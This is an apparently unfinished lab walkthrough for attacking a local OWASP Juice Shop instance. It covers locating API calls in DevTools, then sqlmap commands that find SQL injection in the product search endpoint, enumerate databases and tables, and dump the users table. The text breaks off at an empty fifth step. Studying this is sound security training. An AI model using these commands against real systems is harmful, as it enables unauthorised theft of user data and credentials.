## 1. To Find API Calls:
- **Open DevTools (F12)** → Go to **Network tab**
- **Check "Preserve log"**
- **Click on the “XHR” or “Fetch” filter**
- **Refresh the JuicyShop page** (Ctrl+R)


### 2. **Look in Network Tab Filters**
Use these filters from the top bar of the DevTools “Network” tab:
- `All` → Everything (just spammy)
- `XHR` → API responses like JSON
- `JS` or `Doc` → Sometimes the app loads things differently


## Steps::
Step 1: Run SQLMap on the API Endpoint or any Endpoint to find the Vulnerable Param: `sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch --level=2 --risk=2`

Step 2: Enumerate the Databases: `sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch --dbs`
- This will list all the databases in the backend SQL server.

```
SQLite is file-based, lightweight, and doesn’t support full multi-user DBMS features like MySQL/PostgreSQL.
```

Step 3: Enumerate Tables from Main DB: `sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch -D main --tables`

Step 4: Dump Data from the users Table `sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch -D main -T users --dump`
```
add --limit 5 to pull just a few rows.
Want to see only column names first? Use --columns instead of --dump.
```

Step 5: 

